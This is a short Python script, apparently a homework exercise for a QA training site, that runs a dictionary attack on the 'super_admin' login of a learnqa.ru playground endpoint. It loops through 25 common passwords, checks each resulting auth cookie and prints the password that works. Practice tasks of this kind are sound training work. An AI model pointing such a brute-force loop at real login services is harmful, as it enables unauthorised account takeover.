import requests


passwords = ['password', '123456', '12345678', 'abc123', 'qwerty', 'monkey', 'letmein', 'dragon', '111111',
             'baseball', 'iloveyou', 'trustno1', '1234567', 'sunshine', 'master', '123123', 'welcome', 'shadow',
             'ashley', 'football', 'jesus', 'michael', 'ninja', 'mustang', 'password1']

for pas in passwords:
    payload = {'login': 'super_admin', 'password': f'{pas}'}
    response1 = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data=payload)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}

    response2 = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies=cookies)
    if response2.text == 'You are NOT authorized':
        print(response2.text)
    else:
        print(response2.text)
        print(payload['password'])
        break